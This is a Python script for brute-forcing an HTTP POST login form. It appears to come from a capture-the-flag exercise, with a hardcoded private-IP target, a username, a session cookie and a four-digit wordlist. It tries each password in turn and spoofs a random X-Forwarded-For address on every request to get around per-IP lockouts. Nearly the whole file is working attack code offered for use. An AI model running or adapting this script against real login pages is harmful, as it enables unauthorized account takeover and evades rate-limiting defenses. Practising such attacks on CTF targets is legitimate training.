#!/usr/bin/env python3
"""
HTTP POST Form Brute-Force Script (Sequential with live progress)
"""

import sys
import time
import random
import requests

def load_passwords(password_file):
    """Load passwords from file"""
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: Password file '{password_file}' not found")
        sys.exit(1)

def test_password(password, target_url, headers, data_template, failure_string, username):
    """Test a single password against the target"""
    # Prepare the POST data with current password
    post_data = data_template.replace("^PASS^", password)
    
    try:
        headers['Origin'] = "http://" + password
        headers['X-Forwarded-For'] = f"10.0.0.{random.randint(1, 255)}"
        response = requests.post(
            target_url,
            headers=headers,
            data=post_data,
            timeout=10
        )
        
        # Check if failure string is in response
        if failure_string in response.text:
            return {
                'password': password,
                'success': False,
                'status': response.status_code,
                'length': len(response.text)
            }
        else:
            # Failure string NOT found - possible success!
            return {
                'password': password,
                'success': True,
                'status': response.status_code,
                'length': len(response.text),
                'response_preview': response.text[:500]  # First 500 chars
            }
            
    except requests.exceptions.RequestException as e:
        return {
            'password': password,
            'success': False,
            'error': str(e)
        }

def main():
    # Configuration - MATCHES YOUR HYDRA SETUP
    TARGET_URL = "http://10.67.178.149/auth.php"
    USERNAME = "deliver11"
    PASSWORD_FILE = "farewell_ctf/tokyo_4digits.txt"
    FAILURE_STRING = "auth_failed"  # Text that appears on failed login
    
    # Headers from your Hydra command
    HEADERS = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://10.67.178.149/',
        'Cookie': 'PHPSESSID=tan3ulmipm2fa1cano04bd2uv6',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'
    }
    
    # POST data template
    POST_DATA = "username=deliver11&password=^PASS^"
    
    # Load passwords
    print(f"[*] Loading passwords from '{PASSWORD_FILE}'...")
    passwords = load_passwords(PASSWORD_FILE)
    total_passwords = len(passwords)
    print(f"[*] Loaded {total_passwords} passwords")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Failure string: '{FAILURE_STRING}'")
    print("-" * 60)
    
    # Test the failure string first
    print("[*] Testing failure string with wrong password...", end="")
    test_result = test_password("wrongpassword123", TARGET_URL, HEADERS, POST_DATA, FAILURE_STRING, USERNAME)
    print("\r", end="")  # Clear the line
    
    if 'error' in test_result:
        print(f"[!] Connection error: {test_result['error']}")
        print("[!] Check target URL and network connectivity")
        sys.exit(1)
    
    if test_result['success']:
        print(f"[!] WARNING: Failure string '{FAILURE_STRING}' not found in failed response!")
        print(f"[!] The script may produce false positives.")
        print(f"[!] Response status: {test_result['status']}, Length: {test_result['length']}")
        print("[?] Continue anyway? (y/N): ", end="")
        if input().lower() != 'y':
            sys.exit(0)
    else:
        print(f"[✓] Failure string check passed (found '{FAILURE_STRING}' in response)")
    
    print("-" * 60)
    print("[*] Starting sequential brute-force...")
    print("[*] Press Ctrl+C to stop")
    print("-" * 60)
    
    # Sequential testing
    tested = 0
    start_time = time.time()
    found_password = None
    last_update_time = start_time
    
    try:
        for password in passwords:
            tested += 1
            
            # Calculate progress and rate
            current_time = time.time()
            elapsed = current_time - start_time
            rate = tested / elapsed if elapsed > 0 else 0
            
            # Update progress every 0.1 seconds (smoother display)
            if current_time - last_update_time >= 0.1:
                # Use \r to overwrite the line
                progress_percent = (tested / total_passwords) * 100
                print(f"\r[*] Progress: {tested}/{total_passwords} ({progress_percent:.1f}%) | Rate: {rate:.1f}/sec | Testing: {password}", end="", flush=True)
                last_update_time = current_time
            
            # Test the password
            result = test_password(password, TARGET_URL, HEADERS, POST_DATA, FAILURE_STRING, USERNAME)
            
            # Check for success
            if result['success']:
                # Clear the progress line first
                print("\r" + " " * 100, end="\r")
                
                found_password = password
                print(f"\n" + "="*60)
                print(f"[✓] POTENTIAL SUCCESS FOUND!")
                print(f"[✓] Password: {password}")
                print(f"[✓] Attempt: {tested}/{total_passwords}")
                print(f"[✓] Status Code: {result['status']}")
                print(f"[✓] Response Length: {result['length']}")
                
                # Show more of the response
                preview = result.get('response_preview', '')
                if preview:
                    print(f"\n[✓] Response Preview:")
                    print("-" * 40)
                    print(preview)
                    print("-" * 40)
                
                print(f"\n[?] Continue testing other passwords? (y/N): ", end="")
                if input().lower() != 'y':
                    break
                
                print(f"[*] Continuing...")
                # Print current progress before continuing
                progress_percent = (tested / total_passwords) * 100
                print(f"\r[*] Progress: {tested}/{total_passwords} ({progress_percent:.1f}%) | Rate: {rate:.1f}/sec | Last: {password}", flush=True)
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.05)  # Uncomment if needed
    
    except KeyboardInterrupt:
        # Clear the progress line
        print("\r" + " " * 100, end="\r")
        print(f"\n[!] Attack interrupted by user")
    
    finally:
        # Clear the progress line
        print("\r" + " " * 100, end="\r")
        
        elapsed = time.time() - start_time
        print(f"\n" + "="*60)
        print(f"[*] Attack completed")
        print(f"[*] Tested: {tested}/{total_passwords} passwords")
        print(f"[*] Time elapsed: {elapsed:.1f} seconds")
        print(f"[*] Average rate: {tested/elapsed:.1f} passwords/sec" if elapsed > 0 else "")
        
        if found_password:
            print(f"[✓] Potential password found: {found_password}")
        else:
            print(f"[!] No valid password found")
        
        print("="*60)

if __name__ == "__main__":
    main()
